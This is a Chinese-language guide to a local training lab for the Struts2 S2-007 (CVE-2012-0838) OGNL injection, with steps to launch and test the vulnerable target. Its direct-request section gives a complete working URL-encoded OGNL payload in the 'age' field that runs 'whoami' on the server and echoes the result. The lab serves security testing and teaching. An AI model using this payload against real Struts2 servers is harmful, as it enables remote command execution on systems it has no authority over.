# struts2-s2-007 操作教程

- 类型：单体靶场
- 目录：`struts2-s2-007`
- 端口：`9962`
- 推荐入口：`/user.action`

## 这是什么

Struts2 `S2-007 / CVE-2012-0838` 演示靶场。核心点是 `age` 字段既有类型转换，又配置了 `UserAction-validation.xml`；当提交值触发转换错误时，Struts2 会在错误处理流程里对拼接后的字符串再次做 OGNL 解析。

## 启动前准备

1. 在仓库根目录执行 `bash run-local-build.sh`。
2. 等待对应容器启动完成，并确认端口 `9962` 已经监听。
3. 如果你还想通过首页统一发包，再额外确认 `http://宿主机IP:5000/` 能打开。

## 方式一：通过页面点击测试

1. 打开 `http://宿主机IP:9962/user.action`。
2. 先点 `回显 whoami`，页面会把 payload 自动填到 `age`。
3. 提交后观察是否直接把命令结果写回响应。
4. 再点 `touch 标记文件`，验证盲执行场景。

## 方式二：通过首页测试

1. 打开 `http://宿主机IP:5000/`。
2. 在搜索框输入 `struts2_s2_007、s2-007、struts2` 过滤到当前项目。
3. 先跑 `struts2_s2_007_attack_whoami`。
4. 再跑 `struts2_s2_007_normal` 做正常提交流量对照。

推荐直接使用的首页条目：
- `struts2_s2_007_attack_whoami`：类型转换错误流程中执行 `whoami`
- `struts2_s2_007_normal`：正常资料提交

## 方式三：直接访问接口测试

1. 触发漏洞：

```bash
curl -i -X POST "http://宿主机IP:9962/user.action" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "name=demo&email=demo%40example.com&age=%27+%2B+%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew+java.lang.Boolean%28%22false%22%29%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C%23cmd%3D%27whoami%27%2C%23p%3D%40java.lang.Runtime%40getRuntime%28%29.exec%28%23cmd%29%2C%23in%3Dnew+java.io.BufferedReader%28new+java.io.InputStreamReader%28%23p.getInputStream%28%29%29%29%2C%23buf%3Dnew+char%5B256%5D%2C%23len%3D%23in.read%28%23buf%29%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse%28%29.getWriter%28%29%2C%23out.println%28new+java.lang.String%28%23buf%2C0%2C%23len%29%29%2C%23out.close%28%29%29+%2B+%27"
```

2. 正常提交：

```bash
curl -i -X POST "http://宿主机IP:9962/user.action" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "name=demo&email=demo%40example.com&age=18"
```

## 测试时重点看什么

1. `age` 字段是否因为类型转换失败进入错误流程。
2. 错误页里是否不是原样回显，而是直接执行了拼进去的 OGNL。
3. 正常整数年龄提交时是否只进入成功页面。

## 相关入口

- 总控台：`http://宿主机IP:5000/`
- 文档索引：[`doc/README.md`](../README.md)
- 根项目说明：[`README.md`](../../README.md)
